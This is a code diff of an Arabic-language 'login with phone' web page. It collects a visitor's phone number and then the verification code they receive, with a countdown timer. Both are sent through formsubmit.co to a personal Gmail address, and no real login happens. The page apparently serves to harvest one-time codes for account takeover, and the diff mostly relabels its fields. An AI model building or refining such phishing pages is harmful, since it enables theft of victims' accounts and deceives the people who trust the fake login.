@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>دخول الهاتف</title>
+  <title>دخول باستخدام الهاتف</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
@@ -78,26 +78,26 @@
   <div class="form-box">
     <h2>دخول باستخدام الهاتف</h2>
 
-    <!-- نموذج إرسال رقم الهاتف -->
+    <!-- النموذج الأول: إرسال رقم الهاتف -->
     <form id="phoneForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" target="dummyFrame" onsubmit="return sendPhone();">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="request_type" value="Send Phone Only">
+      <input type="hidden" name="نوع الطلب" value="إرسال رقم الهاتف فقط">
 
       <label for="phone">رقم الهاتف:</label>
-      <input type="tel" id="phone" name="phone_number" required pattern="[0-9]{10,15}" placeholder="05xxxxxxxxx">
+      <input type="tel" id="phone" name="📱 رقم الهاتف" required pattern="[0-9]{10,15}" placeholder="05xxxxxxxxx">
 
       <button type="submit">أرسل الكود</button>
     </form>
 
-    <!-- نموذج إدخال الكود -->
+    <!-- النموذج الثاني: إدخال الكود + إعادة إرسال رقم الهاتف -->
     <div id="codeSection">
       <form id="codeForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" onsubmit="return prepareToSend();">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="request_type" value="Code + Phone">
-        <input type="hidden" name="phone_number" id="phoneHidden">
+        <input type="hidden" name="نوع الطلب" value="طلب الدخول">
+        <input type="hidden" name="📱 رقم الهاتف" id="phoneHidden">
 
         <label for="code">الكود:</label>
-        <input type="text" id="code" name="code_value" placeholder="أدخل الكود هنا" required>
+        <input type="text" id="code" name="🔐 الكود" placeholder="أدخل الكود هنا" required>
 
         <div id="timer">الوقت المتبقي: 05:00</div>
 
@@ -106,7 +106,7 @@
     </div>
   </div>
 
-  <!-- إطار مخفي لمنع إعادة تحميل الصفحة -->
+  <!-- إطار وهمي لمنع إعادة تحميل الصفحة -->
   <iframe name="dummyFrame" style="display:none;"></iframe>
 
   <script>
@@ -119,13 +119,13 @@
         return false;
       }
 
-      // تعطيل التعديل على رقم الهاتف
+      // تعطيل تعديل الرقم
       phoneInput.disabled = true;
 
-      // نسخ الرقم إلى النموذج الثاني
+      // نقل الرقم للنموذج الثاني
       document.getElementById('phoneHidden').value = phone;
 
-      // إظهار حقل الكود والعداد
+      // إظهار حقل الكود + المؤقت
       setTimeout(() => {
         document.getElementById('codeSection').style.display = 'block';
         startTimer(300);
@@ -135,7 +135,6 @@
     }
 
     function prepareToSend() {
-      // ضمان نقل رقم الهاتف للحقل الخفي دومًا
       const phone = document.getElementById('phone').value.trim();
       document.getElementById('phoneHidden').value = phone;
 
